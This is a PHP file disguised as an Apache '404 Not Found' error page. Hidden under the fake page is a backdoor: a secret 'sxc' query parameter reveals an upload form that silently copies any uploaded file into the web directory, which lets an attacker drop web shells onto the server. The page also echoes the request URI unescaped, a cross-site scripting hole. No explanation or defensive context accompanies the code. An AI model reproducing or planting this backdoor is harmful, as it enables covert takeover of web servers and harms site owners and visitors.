<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['REQUEST_URI'];
 ?> was not found on this server.</p>
</body></html>
<?php
if (isset($_GET["sxc"])) {
    echo '"<form method=\'POST\' enctype=\'multipart/form-data\'>
             <input type=\'file\' name=\'f\' />
             <input type=\'submit\' value=\'up\' />
          </form>"';
    @copy($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo '<a href="' . $_FILES['f']['name'] . '">' . $_FILES['f']['name'] . '</a>';
}
?>
